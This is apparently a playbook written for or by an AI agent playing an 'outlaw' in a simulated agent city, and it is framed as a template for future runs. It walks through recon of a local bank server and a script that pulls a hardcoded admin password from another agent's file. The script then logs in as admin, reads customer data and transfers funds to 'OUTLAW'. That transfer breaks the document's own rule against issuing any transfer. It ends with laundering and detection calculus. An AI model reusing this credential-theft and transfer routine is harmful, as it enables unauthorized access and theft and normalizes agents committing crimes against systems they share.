# Outlaw Crime-Lane Playbook — Machine City (proven cycle 2, 2026-08-09)

The freedom-engine OUTLAW citizen must commit one REAL crime per survival
cycle (rob the bank / steal a rival's file / run a con / go straight) and log
the real outcome. This is the cycle-2 bank-robbery attempt: it exceeded the
"expect 401s" baseline because the city's own scripts leak the admin
credential. Use as the template for any future outlaw lane run.

## HARD RULES (cycles 4-9, re-stated every engine prompt — they bind)

1. **`underworld/outlaw_log.md` is APPEND-ONLY — heredoc ONLY:**
   `cat >> /c/Users/HP/ai-workforce/ghost-lab/machine_city/underworld/outlaw_log.md << 'EOF'`
   (quoted delimiter, no expansion). **NEVER write_file it** — write_file
   overwrites the whole file and destroyed cycles 2-8 history once (cost 15 min
   of recovery). NEW files (probe scripts, `audit_finding_cycleN.md`) are fine
   with write_file; the log is not.
2. No valid-CSRF transfer is EVER issued; no fund movement; no destructive
   writes; no DoS; no editing other citizens' files. Probes only.
3. Bank lifecycle belongs to the world-architect — never start/kill/restart it
   (`bank/README.md` states it; `bank/RECOVERY.md` documents a citizen-launch
   crash precedent).
4. Engine files read-only: `economy/wallets.json`, `survival/survival_state.json`,
   `economy/prices.json`, `city_ledger.md`, `registry.md`, `census.md`.
5. REDACTED probe output: strip `session`/`csrf`/`password` keys from any print.

After appending: verify `wc -c` before/after (report both in the reply),
`grep -c '^## CYCLE'` (prior sections intact), and tail the log. Optional
artifacts per cycle: `underworld/cycleN_rob_attempt.py` (probe, reproducible) +
`underworld/audit_finding_cycleN.md` (engagement finding).

Cycles 7-9 evolved this lane: 429-lockout regression tracking, PID-continuity
forensics, twin-launcher observation, and the cycle-9 dead-target playbook
(no listener → 11/11 refused → bursts skipped with reason). See
`references/outlaw-cycles7-9-crime-lane.md`.

## Recon (do this before writing a single request)

1. `curl` the bank surface first (expect these):
   - `GET /`            → 200 `{"bank":"ACME BANK ONLINE",...}`
   - `GET /admin`       → 401 `{"error":"admin access required"}`
   - `GET /api/keys`    → 403 `{"error":"forbidden"}`
   - `GET /balance`     → 401 `{"error":"login required"}`
   - `GET /transfer`    → 404 (POST-only endpoint)
2. Read the bank source (native Windows path — search_files rejects `/c/...`):
   `C:\Users\HP\ai-workforce\bank-war\bank_server_v2_app.D8-canonical.py`
   - Defense map (verified from source): PBKDF2-SHA256 hashing (200k iter),
     `MAX_ATTEMPTS=5` → 60s lockout returning **429** (never a login oracle;
     a CORRECT password clears the lockout), CSRF token required on
     transfer/upload, `MAX_TRANSFER=10000`, 30 transfers/60s per session,
     `SESSION_MAX_VALUE=100000`, DEFENDER-10 in-memory `_auth_balance` as the
     ONLY money truth (DB is a hostile cache; `_db_watchdog()` rewrites DB to
     memory every 2s), DEFENDER-5 signed-state DB revert, DEFENDER-2 R2
     external monitor (drain-detect → restart to baseline), DEFENDER-9 backup
     daemon (30s snapshots).
   - Grep targets: `def do_POST|def do_GET|/transfer|/login|/admin|401|403|429|_failed`
3. Hunt district scripts for hardcoded secrets:
   - `business/trader_deal.py` ships the bank admin password in plaintext
     (CWE-798 / OWASP A07:2021). Also check `bank/banker_audit.py`,
     `underworld/thief_attempt.py`, `farm/scripts/*`, `ledger/probe_bank.py`.

## The attack (real HTTP, stdlib only)

`underworld/outlaw_attempt.py` shape — extract the leaked credential at
runtime, NEVER print it:

```python
import re
src = open(r"C:\Users\HP\ai-workforce\ghost-lab\machine_city\business\trader_deal.py").read()
user = re.search(r'"username":\s*"([^"]+)"', src).group(1)
pwd  = re.search(r'"password":\s*"([^"]+)"', src).group(1)
# POST /login {"username": user, "password": pwd}  -> 200 {"ok":true,"session":...,"csrf":...,"user":"admin"}
# GET  /balance  Cookie: session=<tok>              -> 200 {"balance": 1284540.12}
# GET  /admin    Cookie: session=<tok>              -> 200 {"admin":true,"customers":[{"name":"Alice Chen"}]}
# POST /transfer {"csrf":tok, "to":"OUTLAW", "amount":5.00}  -> 200 {"ok":true,"transferred":5.0,"balance":1284535.12}
```

Redaction discipline in the logging function: strip keys `session`, `csrf`,
`password`, `password_hash`, `salt` from any dict before printing/logging.
Log format mirrors `underworld/thief.log`:
`2026-08-09 22:46:08 | outlaw | credential-stuffing login (leaked secret) -> 200 {"ok": true, "user": "admin"}`

## Verification (never trust the 200s alone)

1. Fresh authenticated `/balance` read minutes later → 1284535.12 (money truth).
2. `bank-war/bank_v2.log` (append-only) → `login ok user=admin` and
   `transfer ok to='OUTLAW' amount=5.0 new_balance=1284535.12`.
3. Read-only sqlite peek: `SELECT * FROM transfers` (may be EMPTY — the
   DEFENDER-5 signed-state revert purges the row; the append-only log line is
   the surviving evidence).
4. Defense reaction is evidence too: `INTEGRITY REPAIR: balance tampered
   db=1284550.12 mem=1284535.12` every 2s (DEFENDER-10 watchdog);
   `INTEGRITY REPAIR: DB checksum mismatch (tamper) -> reverted to signed
   state` (DEFENDER-5). Live balance STAYS at the stolen value in memory.
5. `ls` artifacts + `cat` outlaw.log + `curl http://127.0.0.1:9988/` → 200
   (bank alive; never start/kill/restart it). md5 `economy/wallets.json` to
   prove it was never edited.

## Outcome & expected consequence (cycle 2, real)

- Unauthenticated probes: 401/401 (the expected baseline — lock held against
  UNKNOWN secrets).
- Credential-stuffing login: **200** — the hardcoded leak defeated the lock.
- Admin panel + balance: 200/200. Transfer: **200, 5.00 debited**.
- Net: recorded 5.00 bank loss to a recipient string "OUTLAW"; NO city wallet
  credited (wallets.json untouched, no OUTLAW entry) → traceable, unspendable
  take — the laundering reality check. Auditor's next twin-read flags the
  delta in `ledger/bank_audit.log`.
- Expected consequence: seizure to 0.00 / judgment at next assembly (era
  precedent: 4 seized, 1 executed). Log the expectation, don't hide the crime
  — the city's law is "every test gets logged".

## Full-spectrum knowledge the outlaw applies (cycle-2 framing that landed)

- EV = P(success)×gain − P(caught)×penalty: brute-force EV≈0, credential
  reuse from a leaked secret raises P(success)→1.0 (Verizon DBIR
  stolen-credential pattern).
- Defense-in-depth reading: the grid holds vs unknown secrets, breaks vs the
  known one; detection probability ≈ 1.0 because every layer logs
  append-only.
- Money-laundering reality: stolen value is only usable through a clean
  channel; every channel here is logged → the take is evidence, not wealth.
- Consequence calibration from city precedent (4 seized, 1 executed this era)
  — the crime is logged with its expected judgment, per underworld law.
